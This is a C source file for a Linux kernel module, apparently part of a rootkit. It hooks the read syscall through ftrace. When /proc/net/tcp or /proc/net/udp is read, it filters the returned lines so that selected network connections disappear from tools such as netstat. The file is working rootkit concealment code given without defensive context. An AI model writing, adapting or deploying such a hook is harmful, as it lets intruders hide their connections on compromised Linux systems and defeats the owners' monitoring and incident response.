#include <linux/file.h>

#include "utils/excludes/ip_filtering.h"
#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_read.h"

asmlinkage long (*orig_read)(const struct pt_regs *regs);


asmlinkage int hook_read(const struct pt_regs *regs)
{
    unsigned int fd = regs->di;
    char __user *buf = (char __user *)regs->si;
    ssize_t ret;
    struct file *f = fget(fd);

    if (f && f->f_path.dentry) {
        // check if currently reading from /proc/net/tcp or /proc/net/udp
        if (((strcmp(f->f_path.dentry->d_name.name, "tcp") == 0) || (strcmp(f->f_path.dentry->d_name.name, "udp") == 0)) &&
            f->f_path.dentry->d_parent &&
            strcmp(f->f_path.dentry->d_parent->d_name.name, "net") == 0) {

            ret = orig_read(regs);
            if (ret <= 0) {
                fput(f);
                return ret;
            }

            {
                char *kbuf = kmalloc(ret + 1, GFP_KERNEL);
                char *filtered;
                size_t new_len;

                if (!kbuf) {
                    fput(f);
                    return ret;
                }
                if (copy_from_user(kbuf, buf, ret)) {
                    kfree(kbuf);
                    fput(f);
                    return ret;
                }
                kbuf[ret] = '\0';

                filtered = filter_netstat_lines(kbuf, &new_len);
                kfree(kbuf);

                if (filtered) {
                    if (copy_to_user(buf, filtered, new_len)) {
                        kfree(filtered);
                        fput(f);
                        return ret; // fall back to unfiltered data on failure
                    }
                    ret = new_len;
                    kfree(filtered);
                }
            }
            fput(f);
            return ret;
        }
    }
    if (f)
        fput(f);
    ret = orig_read(regs);
    return ret;
}

